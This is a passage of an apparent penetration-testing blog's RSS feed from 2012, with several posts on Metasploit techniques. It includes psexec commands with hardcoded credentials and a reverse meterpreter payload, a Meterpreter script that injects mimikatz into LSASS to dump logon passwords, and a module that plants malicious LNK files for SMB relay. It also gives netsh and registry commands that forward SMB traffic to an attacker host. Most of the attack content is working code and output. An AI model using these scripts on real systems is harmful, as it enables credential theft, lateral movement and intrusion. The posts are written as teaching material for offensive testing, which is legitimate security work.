set ExitOnSession false
exploit -j -z
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Upload file to evil.exe on the C$ share (C$ is default for this module so no reason to set it)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use auxiliary/admin/smb/upload_file
set LPATH evil.exe
set RPATH evil.exe
set RHOST 172.16.195.155
set SMBUser Administrator
set SMBPass Password1234!
run
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Execute PSEXEC using the new service binary that simply executes&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use exploit/windows/smb/psexec
set RHOST 172.16.195.155
set SMBUser Administrator
set SMBPass Password1234!
set DisablePayloadHandler true
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 172.16.195.1
set LPORT 80
exploit -j -z
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The passwords could have just as easily been hashes, and the end result is:&lt;/p&gt;

&lt;p&gt;Well I can&amp;rsquo;t really show you that nothing was detectedâ¦ so I guess you just have to believe me when I say:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; [*] Meterpreter session 2 opened (172.16.195.1:80 -&amp;gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Netstat Post Module for Meterpreter</title>
      <link>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</link>
      <pubDate>Thu, 28 Jun 2012 13:18:52 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</guid>
      <description>&lt;p&gt;Submitted it to MSF via pull request here:Â &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/538&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/538&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Added to trunk:Â &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366026%28v=vs.85%29.aspx&#34;&gt;GetTcpTable&lt;/a&gt; function to railgun:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;session.railgun.add_function(&#39;iphlpapi&#39;, &#39;GetTcpTable&#39;, &#39;DWORD&#39;, [
	[&#39;PBLOB&#39;, &#39;pTcpTable&#39;, &#39;out&#39;],
	[&#39;PDWORD&#39;, &#39;pdwSize&#39;, &#39;inout&#39;],
	[&#39;BOOL&#39;, &#39;bOrder&#39;, &#39;in&#39;]
])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then gauge the size of the table:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;getsize = session.railgun.iphlpapi.GetTcpTable(4,4,true)
buffersize = getsize[&#39;pdwSize&#39;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run the call again with the correct buffer size:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;tcptable = session.railgun.iphlpapi.GetTcpTable(buffersize,buffersize,true)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then it&amp;rsquo;s all just parsing the result. Also pretty straight forward. First we get the number of entries which is held in the first 4 bytes, then just parse the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366917%28v=vs.85%29.aspx&#34;&gt;MIB_TCPTABLE&lt;/a&gt; one &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366909%28v=vs.85%29.aspx&#34;&gt;MIB_TCPROW&lt;/a&gt; at a time (translating the state to something readable):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def parse_tcptable(buffer)
	entries = buffer[0,4].unpack(&amp;quot;V*&amp;quot;)[0]
	print_status(&amp;quot;Total TCP Entries: #{entries}&amp;quot;)
	rtable = Rex::Ui::Text::Table.new(
		&#39;Header&#39; =&amp;gt; &#39;Routing Table&#39;,
		&#39;Indent&#39; =&amp;gt; 2,
		&#39;Columns&#39; =&amp;gt; [&#39;STATE&#39;, &#39;LHOST&#39;, &#39;LPORT&#39;, &#39;RHOST&#39;, &#39;RPORT&#39;]
	)
	offset = 4
	(1..entries).each do
		x = {}
		x[:state] = case buffer[(offset + 0), 4].unpack(&amp;quot;V*&amp;quot;)[0]
		when 1
			&#39;CLOSED&#39;
		when 2
			&#39;LISTEN&#39;
		when 3
			&#39;SYN_SENT&#39;
		when 4
			&#39;SYN_RCVD&#39;
		when 5
			&#39;ESTABLISHED&#39;
		when 6
			&#39;FIN_WAIT1&#39;
		when 7
			&#39;FIN_WAIT2&#39;
		when 8
			&#39;CLOSE_WAIT&#39;
		when 9
			&#39;CLOSING&#39;
		when 10
			&#39;LAST_ACK&#39;
		when 11
			&#39;TIME_WAIT&#39;
		when 12
			&#39;DELETE_TCB&#39;
		else
			&#39;UNDEFINED&#39;
		end
		
		x[:lhost] = Rex::Socket.addr_itoa(buffer[(offset + 4), 4].unpack(&amp;quot;N&amp;quot;)[0])
		x[:lport] = buffer[(offset + 8), 4].unpack(&amp;quot;n&amp;quot;)[0]
		x[:rhost] = Rex::Socket.addr_itoa(buffer[(offset + 12), 4].unpack(&amp;quot;N&amp;quot;)[0])
		if x[:state] == &amp;quot;LISTEN&amp;quot;
			x[:rport] = &amp;quot;_&amp;quot;
		else
			x[:rport] = buffer[(offset + 16), 4].unpack(&amp;quot;n&amp;quot;)[0]
		end

		offset = offset + 20
		rtable &amp;lt;&amp;lt; [x[:state], x[:lhost], x[:lport], x[:rhost], x[:rport]]
	end

	print_status(rtable.to_s)
end
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Integration of Mimikatz into Metasploit Stage1</title>
      <link>https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</link>
      <pubDate>Fri, 15 Jun 2012 14:55:55 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</guid>
      <description>&lt;p&gt;One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.&lt;/p&gt;

&lt;p&gt;Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&amp;rsquo;ll get there in the subsequent posts.&lt;/p&gt;

&lt;p&gt;Ignore the do_cmd for now and I stepped through &lt;a href=&#34;https://malicious.link/blog/2011/5/30/remote-dll-injection-with-meterpreter.html&#34;&gt;remote DLL injection here&lt;/a&gt;. So the first odd lines isÂ &lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;handle = client.railgun.kernel32.CreateNamedPipeW(&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;, &#39;PIPE_ACCESS_DUPLEX&#39;, &#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;, 1, 0, 0, 30000,nil)[&#39;return&#39;]
connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Essentially these connect to the &lt;a href=&#34;http://en.wikipedia.org/wiki/Named_pipe&#34;&gt;Named Pipe&lt;/a&gt; that the sekurlsa.dll uses to talk to the mimikatz.exe in it&amp;rsquo;s normal operation. Then we just use the windows API call &amp;ldquo;ReadFile&amp;rdquo; from there on out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One of the draw backs to doing this all remotely is that Railgun doesn&amp;rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is Â a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&amp;rsquo;ve overcome this for the initial &amp;ldquo;banner&amp;rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &amp;ldquo;ping&amp;rdquo; and &amp;ldquo;getLogonPasswords&amp;rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)&lt;/p&gt;

&lt;p&gt;If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!&lt;/p&gt;

&lt;p&gt;Meterpreter Script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def do_cmd(handle,cmd)
	ucommand = Rex::Text.to_unicode(cmd)
	sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
	good2go = false
	newline = false
	readstring = []
	while good2go == false
		# Have to pull data 1 unicode character at a time
		# this is because the pipe won&#39;t write or read if
		# too much was written or read by the &amp;quot;client&amp;quot; (us)
		pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
		# Check to see if our end of read check is there: n000 @00
		if pull[&#39;lpBuffer&#39;] == &amp;quot;@00&amp;quot; and newline == true
			good2go = true
		else
			readstring &amp;lt;&amp;lt; pull[&#39;lpBuffer&#39;]
		end
		
		# Ready the newline var for previous check on next loop
		if pull[&#39;lpBuffer&#39;] == &amp;quot;n00&amp;quot;
			newline = true
		else
			newline = false
		end
	end
	
	print_status(readstring.join(&amp;quot;&amp;quot;))
end

print_status(&amp;quot;x86 Detected - Using x86 mimikatz&amp;quot;)
handle = client.railgun.kernel32.CreateNamedPipeW(&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;, &#39;PIPE_ACCESS_DUPLEX&#39;, &#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;, 1, 0, 0, 30000,nil)[&#39;return&#39;]
print_status(&amp;quot;Handle: #{handle}&amp;quot;)
framework.threads.spawn(&#39;injectlsass&#39;,false) {
	pid = client.sys.process[&#39;lsass.exe&#39;]
	print_status(&amp;quot;LSASS located at PID: #{pid}&amp;quot;)
	pathtomimi = &amp;quot;C:\\sekurlsa.dll&amp;quot;

	pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
	pay.datastore[&amp;quot;DLL&amp;quot;] = pathtomimi
	pay.datastore[&amp;quot;EXITFUNC&amp;quot;] = &#39;thread&#39;

	raw = pay.generate
	targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
	mem = targetprocess.memory.allocate(raw.length + (30024))
	targetprocess.memory.write(mem, raw)
	sleep(2)
	targetprocess.thread.create(mem, 0)
	print_status(&amp;quot;Successfully Injected into LSASS&amp;quot;)
}
print_status(&amp;quot;Waiting for LSASS injection to complete&amp;quot;)
connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
print_status(&amp;quot;Mimikatz has called home, ready for command&amp;quot;)
sleep(2)
print_status(&amp;quot;Reading banner&amp;quot;)
client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
print_status(&amp;quot;Doing a quick ping to make sure things are working...&amp;quot;)
do_cmd(handle,&#39;ping&#39;)
print_status(&amp;quot;If you made it this far it worked, doing getLogonPasswords&amp;quot;)
do_cmd(handle, &#39;getLogonPasswords&#39;)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Developing the LNK Metasploit post module with Mona</title>
      <link>https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</link>
      <pubDate>Sun, 19 Feb 2012 05:57:02 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</guid>
      <description>&lt;p&gt;I have been using the LNK trick I talked about in my &lt;a href=&#34;https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018&#34;&gt;last post&lt;/a&gt; for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&amp;rsquo;s target.&lt;/p&gt;

&lt;p&gt;Of course the first place I looked was Meterpreter&amp;rsquo;s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa969393.aspx&#34;&gt;work with COM objects&lt;/a&gt;. Something that I donât believe is built into Railgun (yetâ¦ /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx&#34;&gt;using the spec&lt;/a&gt;.. yaâ¦. that didnât go so..*zzzZZZzzzzzzzZzzz&lt;/p&gt;

&lt;p&gt;Enter &lt;a href=&#34;http://redmine.corelan.be/projects/mona&#34;&gt;mona&lt;/a&gt;, the &lt;a href=&#34;http://www.corelan.be/&#34;&gt;Corelan Teamâs&lt;/a&gt; exploit development plugin for &lt;a href=&#34;http://immunityinc.com/products-immdbg.shtml&#34;&gt;Immunity Debugger&lt;/a&gt;. Now, usually it is used exactly as intended, as an exploit development tool, and I guess you could consider my use of it as an extension of that as well. But, anyways, one of Monaâs many and probably one of the least well known functions is âheaderâ. What this function does is simply output a ruby version of the file broken into ASCII and binary parts. Thatâll make much more sense in a sec, back to the problem. I need to recreate a file in a way I can manipulate it on the fly with enough agility to be useful to others in a post module without using the spec or Railgun to assist.&lt;/p&gt;

&lt;p&gt;We start off with the maliciously altered LNK file, and an up to date version of Immunity and mona:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I copied the shortcut file to the C drive so I didnât have to specify a huge path in the mona command, and issued:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;â!mona header C:\autoexec.lnkâ&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, mona breaks up the binary into âunderstandableâ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;header &amp;lt;&amp;lt; Rex::Text.to_unicode(&amp;quot;C:\%\\\\192.168.100.100\\w00t\\bogusimage.png`&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didnât notice the âtickâ ( ` ) at the end of the share string and it cause me a lot of grief.&lt;/p&gt;

&lt;p&gt;Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what?&lt;/p&gt;

&lt;p&gt;Now I have 3 challenges:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;It needs to have a user defined target IP at the very least and anything else I work into a variable option for the user.&lt;/li&gt;
&lt;li&gt;It needs to upload the file to the exploited system.&lt;/li&gt;
&lt;li&gt;It needs to be up to code on the Metasploit coding standards&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Changing the line I found for the share name into this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;lnk &amp;lt;&amp;lt; Rex::Text.to_unicode(&amp;quot;\\\\#{datastore[&#39;LHOST&#39;]}\\#{datastore[&#39;SHARENAME&#39;]}\\#{datastore[&#39;ICONFILENAME&#39;]}`&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;âdatastoreâ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the âregister_optionsâ section of your module:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;OptAddressRange.new(&amp;quot;LHOST&amp;quot;, [ true, &amp;quot;Host listening for incoming SMB/WebDAV traffic&amp;quot;, nil]),
OptString.new(&amp;quot;SHARENAME&amp;quot;, [ true, &amp;quot;Share name on LHOST&amp;quot;, &amp;quot;share1&amp;quot;]),       
OptString.new(&amp;quot;ICONFILENAME&amp;quot;, [ true, &amp;quot;File name on LHOST&#39;s share&amp;quot;, &amp;quot;icon.png&amp;quot;])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.&lt;/p&gt;

&lt;p&gt;Problem 1 solved. Problem 2 was just as easy, the following line:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;file = client.fs.file.new(datastore[&#39;LNKFILENAME&#39;], &#39;wb&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;creates a new file on the victim, and âfile.write(lnk)â writes the binary contents of the âlnkâ variable into it.&lt;/p&gt;

&lt;p&gt;Problem 3 is much more tricky, but here is the path to wisdom:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hope this helps spur people into trying their hand at developing some modules of their own.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>MS08_068 &#43; MS10_046 = FUN UNTIL 2018</title>
      <link>https://malicious.link/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/</link>
      <pubDate>Sat, 11 Feb 2012 08:29:37 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/</guid>
      <description>

&lt;p&gt;*&lt;strong&gt;&lt;em&gt;TL;DR:&lt;/em&gt;&lt;/strong&gt;* SMB Relay + LNK UNC icons = internal pentest pwnage&lt;/p&gt;

&lt;p&gt;I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;MS08_068:&lt;/strong&gt; &lt;a href=&#34;http://www.cvedetails.com/cve/CVE-2008-4037/&#34;&gt;http://www.cvedetails.com/cve/CVE-2008-4037/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In 2008, Microsoft released MS08_068 which patched the &amp;ldquo;SMB Relay&amp;rdquo; attack. To boil this down, an attacker gets a victim to attempt to authenticate to an attacker controlled box. The attack delays its responses to the victim and replays the important parts of the authentication that the victim sent back at the victim. You can find out a lot more about this vulnerability here: &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;One thing to take away from that post is that the patch stops Attacker &amp;lt;=&amp;gt; Victim, but does not / cannot fix Victim &amp;lt;=&amp;gt; Attacker &amp;lt;=&amp;gt; &lt;strong&gt;Victim2&lt;/strong&gt; (use authentication from Victim to replay to Victim2)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;MS10_046:&lt;/strong&gt; &lt;a href=&#34;http://www.cvedetails.com/cve/CVE-2010-2568/&#34;&gt;http://www.cvedetails.com/cve/CVE-2010-2568/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In 2010, Microsoft released MS10_046 which patched the Stuxnet LNK vulnerability where a malicious DLL could be loaded (locally or remotely over WebDAV) using the path of the shortcut&amp;rsquo;s icon reference. LNK files are Windows shortcut files that allow the icons of the files to be changed much more dynamically than any other file type (Right click a shortcut, go to Properties, and just simply click the &amp;lsquo;Change Icon&amp;rsquo; button). I could certainly be wrong here, but I believe all Microsoft patched was the ability to use this feature to load the DLLs via a certain Control Panel object. Which leaves the ability to load shortcut (LNK) icons from wherever we wish. ;-)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The Setup:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine&amp;rsquo;s IP and use SMB_Relay to replay those credentials to a system in which we&amp;rsquo;ve identified by one means or another as an &amp;lsquo;important&amp;rsquo; host to get on.&lt;/p&gt;

&lt;p&gt;Attacker uploads malicious LNK file to network share on &lt;strong&gt;FILE SHARE&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Victim views it on &lt;strong&gt;WORKSTATION&lt;/strong&gt; that initiates an connection to &lt;strong&gt;ATTACKER&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Attacker relays those authentication attempts to &lt;strong&gt;FILE SHARE&lt;/strong&gt;, gaining code execution if &amp;lsquo;Victim&amp;rsquo; is an admin on &lt;strong&gt;FILE SHARE&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If not, then NetNTLM are still visible in the logs and can be attempted to crack, or just wait for more people to view the LNK file on the public share, and hope that an admin comes by at some point.&lt;/p&gt;

&lt;p&gt;Your mileage will vary based on where you put the LNK file.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The Video:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;center&gt;&lt;iframe align=center width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/FxekUPY5ojU&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;I have created a post module to automate the process of creating and uploading the LNK file (so you don&amp;rsquo;t have to have a Windows box lying around). Here it is in action:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Module options (post/windows/escalate/droplnk):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   ICONFILENAME  icon.png         yes       File name on LHOST&#39;s share
   LHOST         192.168.2.16     yes       Host listening for incoming SMB/WebDAV traffic
   LNKFILENAME   Words.lnk        yes       Shortcut&#39;s filename
   SESSION       1                yes       The session to run this module on.
   SHARENAME     share1           yes       Share name on LHOST

2012-02-11 07:17:19 +0000 2 1 post(droplnk) &amp;gt; run

[*] Creating evil LNK
[*] Done. Writing to disk - C:\DocuMe~1\Administrator\Words.lnk
[*] Done. Wait for evil to happen..
[*] Post module execution completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can find the code here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb&#34;&gt;https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Going forward:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Obviously this isn&amp;rsquo;t so effective remotely out of the box and there currently isn&amp;rsquo;t a SMB_Relay for WebDAV (although I&amp;rsquo;m guessing that would work). However I was able to construct a crude way getting smb_relaying working using some pretty loud system changes to an exploited host:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Step 1&lt;/strong&gt;: Disable SMB on Port 445 (it will still operate on 139 as it is a failover), this setting requires a reboot to take effect and can be done using the following command:&lt;br /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;reg add HKLM\System\CurrentControlSet\Services\NetBTParameters /v SMBDeviceEnabled /t REG_DWORD /d 0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Step 2&lt;/strong&gt;: Port forward the traffic out to your remote attacker host over a port that is allowed out, used 80:

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;netsh int portproxy v4tov4 listenport=445 connectaddress=the.bad.guy.com connectport=80&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Step 3&lt;/strong&gt;: Set up SMB_Relay listening on that port on your attacker with a route in meterpreter to send all relayed authentication through your meterpreter session into and at the targeted host.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These steps can get you noticed in almost every way, so it&amp;rsquo;s not recommended, I just did it as a PoC. I mean how cool is it to remotely exploit SMB vulns ;-)&lt;/p&gt;

&lt;p&gt;The other thing is, administrators are becoming much more rare as years move along and people use lower priv users for their daily tasks, so there are currently feature requests in to the Metasploit project to make it so when you get SMB_Relay correctly forwarding good credentials, even if they aren&amp;rsquo;t admin and you cannot get code execution it would be nice to be able to go through the files that person has access to on the targeted system / file share. A final pipe dream of this post is to have a multi-threaded smb_relay that 2, 3 or even 10 servers can be targeted with the relayed authentication.&lt;/p&gt;

&lt;p&gt;just saying&amp;rsquo;â¦. /me nudges the Metasploit devsâ¦&lt;/p&gt;

&lt;h3 id=&#34;references&#34;&gt;References:&lt;/h3&gt;

&lt;h4 id=&#34;smb-relay-references&#34;&gt;SMB_Relay References:&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&amp;ldquo;Initial?&amp;rdquo; release in 2003 - &lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;http://www.xfocus.net/articles/200305/smbrelay.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Microsoft advisory - &lt;a href=&#34;http://technet.microsoft.com/en-us/security/bulletin/ms08-068&#34;&gt;http://technet.microsoft.com/en-us/security/bulletin/ms08-068&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Metasploit blog post - &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Metasploit module - &lt;a href=&#34;http://www.metasploit.com/modules/exploit/windows/smb/smb_relay&#34;&gt;http://www.metasploit.com/modules/exploit/windows/smb/smb_relay&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;lnk-dll-loader-references&#34;&gt;LNK DLL Loader References:&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Microsoft advisory - &lt;a href=&#34;http://technet.microsoft.com/en-us/security/advisory/2286198&#34;&gt;http://technet.microsoft.com/en-us/security/advisory/2286198&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Metasploit blog post - &lt;a href=&#34;https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening&#34;&gt;https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Some of HDM&amp;rsquo;s research - &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ISS&amp;rsquo;s advisory - &lt;a href=&#34;http://blogs.iss.net/archive/remotedllpreloadingv.html&#34;&gt;http://blogs.iss.net/archive/remotedllpreloadingv.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Metasploit module - &lt;a href=&#34;http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader&#34;&gt;http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Video of the module in action - &lt;a href=&#34;http://www.commonexploits.com/?p=151&#34;&gt;http://www.commonexploits.com/?p=151&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>(UAC) User Assisted Compromise</title>
      <link>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</link>
      <pubDate>Tue, 03 Jan 2012 06:56:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</guid>
      <description>&lt;p&gt;A number of times during tests I&amp;rsquo;ve actually run into those mythical creatures called &amp;ldquo;patched windows machines&amp;rdquo;. At &lt;a href=&#34;http://www.derbycon.com&#34;&gt;DerbyCon&lt;/a&gt; &lt;a href=&#34;http://twitter.com/carnal0wnage&#34;&gt;Chris Gates&lt;/a&gt; and I released the &amp;ldquo;Ask&amp;rdquo; post module (which I had failed to publish). This module very simply uses the &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85&#34;&gt;ShellExecute windows function&lt;/a&gt;.aspx&amp;rdquo;) via &lt;a href=&#34;http://dev.metasploit.com/redmine/projects/framework/wiki/RailgunUsage&#34;&gt;Railgun&lt;/a&gt; with the undocumented (but very well known) operator of &amp;lsquo;runas&amp;rsquo;. These two lines accomplished that:&lt;/p&gt;

